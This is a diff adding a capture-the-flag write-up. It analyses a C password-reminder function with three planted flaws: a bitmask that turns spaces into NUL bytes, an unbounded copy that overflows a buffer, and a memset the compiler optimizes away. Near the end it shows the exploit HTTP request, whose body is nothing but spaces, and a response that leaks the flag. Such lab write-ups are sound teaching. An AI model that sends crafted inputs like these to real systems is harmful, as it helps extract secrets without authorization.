@@ -73,7 +73,7 @@ void ctf(char *password, int print) {
 		printf("\n");
 	}
 	// Erase sensitive information!!
-  //WARNING 3!
+  	//WARNING 3!
 	memset(buffer, ' ', 256);
 }
 
@@ -87,5 +87,82 @@ int main(int argc, char *argv[]) {
 	return 0;
 }
 ```
-As you can see in the code, I added 3 warnings, let's check it, to see if we can exploit them.
+As you can see in the code, I added 3 warnings, let's check it to see how we can retrive the password.
 
+## Warning 1
+```c
+*password &= ~0x20;
+```
+This part makes the AND operation in the sixth bit so:
+
+If we have an 'a' and we want to change to 'A' we do this:
+
+```
+a 		=	0110 0001
+~0x20	=	1101 1111
+    	 	---------
+A 		=	0100 0001    
+```
+This type of bit manipulation is also pretty dangerous, mostly because of we can send NULL 
+signals use a SPACE character:
+
+```
+' '		=	0010 0000
+~0x20	=	1101 1111
+    	 	---------
+NULL	=	0000 0000    
+```
+Note for the future: "Send whitespaces, maybe i'll find something"
+
+## Warning 2
+```c
+while (*password) {
+*buffer = *password;
+		buffer++;
+		password++;
+	}
+```
+This is another example of NOT to copy a variable, with this type of code I can write outside
+the buffer (buffer overflow) and access other parts of the memory or even manipulate
+the flow of the program; sending NULL signal for example, because the while will never
+be true.
+
+## Warning 3
+```c
+memset(buffer, ' ', 256);
+```
+This function is being optimized by the compiler, and it's not running. ¯\_(ツ)_/¯
+
+
+## Exploit
+With everything that we learned before we can clearly send this NULL signals and watch the
+behaviour of the app.
+
+```tcp
+POST /password/remind HTTP/1.1
+Host: xxx.es
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 9
+
+                                                      
+```   
+Response:                                                
+```tcp
+HTTP/1.1 200 OK
+Content-Length: 110
+Content-Type: application/octet-stream
+Date: Sun, 27 Dec 2020 19:51:19 GMT
+Connection: close
+
+Looks like you forgot your password! Your password is: FLAG[INSOVIETRUSSIAFLAGCAPTURESU]
+``` 
+
+That's all folks!
